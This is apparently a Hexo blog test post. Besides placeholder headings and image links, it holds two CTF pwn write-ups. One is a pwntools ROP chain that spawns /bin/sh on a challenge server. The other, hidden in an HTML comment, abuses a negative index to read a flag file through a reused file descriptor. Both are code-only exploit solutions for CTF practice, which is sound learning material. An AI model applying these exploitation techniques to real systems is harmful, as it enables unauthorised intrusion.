---
title: test
date: 2025-07-24 19:19:42
tags: test
categories:
    - 教學
keywords:
    - hexo
    - blog
    - 部落格
    - github
description: "這是一則關於文章的簡要說明"
---

# test1

## test2

### test3

-   img
    <!-- ![image1](./test/frostbean_thinking.jpg)
    ![image2](test/frostbean_thinking.jpg) -->
    ![image3](frostbean_thinking.jpg)
    <!-- ![image2](frostbean_thinking.jpg) -->

### gadgethunter writeup

```python
from pwn import *

# con = process("./gadgethunter")
con = remote("ctf.adl.tw", 10004)

buf_addr = 0x4c6170
# buf = b'/bin/bash\x00'
pop_rdi = 0x0000000000401ebf # : pop rdi ; ret
pop_rsi = 0x0000000000409eee # : pop rsi ; ret
pop_rax_rdx_rbx = 0x0000000000485c0a #: pop rax ; pop rdx ; pop rbx ; ret
bin_bash = 0x7fffffffdb60 #0x7ffeded74890
pop_rsp = 0x000000000040231e #: pop rsp ; ret
syscall = 0x0000000000401c74 # : syscall
add_al_11_mov_rax8_rdx = 0x00000000004520a1 #: adc al, 0x11 ; mov qword ptr [rax + 8], rdx ; ret
payload = b'a'*40 + p64(pop_rax_rdx_rbx) + p64(0x4c6157) +b'/bin/sh\x00' + \
p64(0x0) + p64(add_al_11_mov_rax8_rdx) + p64(pop_rax_rdx_rbx) + p64(0x3b) + \
p64(0x0) + p64(0x0) + p64(pop_rsi) + p64(0x0) + p64(pop_rdi) + p64(buf_addr) + \
p64(syscall)

con.recvuntil(b'message:\n')
raw_input()
con.sendline(payload)
# sleep(0.1)
# con.sendline(buf)

con.interactive()
con.close()
```
### open_book_exam writeup
```python
# Oh noooo~, I can't publish this, you will never find it!
```
<!-- :::info
it's info
:::

:::danger
it's danger
::: -->

<!-- 
from pwn import *

# c = process("./open_book_exam")
c = remote("ctf.adl.tw", 10006)
book_fd  = 0x104010
question = 0x104050
cur_book = 0x104060

# idx = (book_fd-question)//4 + 1

# open book
c.recvuntil(b'> ')
c.sendline(b'1')
# open flag
c.recvuntil(b'> ')
c.sendline(b'5')

# open book
c.recvuntil(b'> ')
c.sendline(b'1')
# open chinese
c.recvuntil(b'> ')
c.sendline(b'1')

fd = 3
# write book
c.recvuntil(b'> ')
c.sendline(b'3')
# write fd
c.recvuntil(b'> ')
c.sendline(b'-15')
c.recvuntil(b'ans: ')
c.sendline(str(fd).encode())
fd+=1
# read book
c.recvuntil(b'> ')
c.sendline(b'2')

print(c.recvlines(3)[2])

# c.interactive()
c.close()
 -->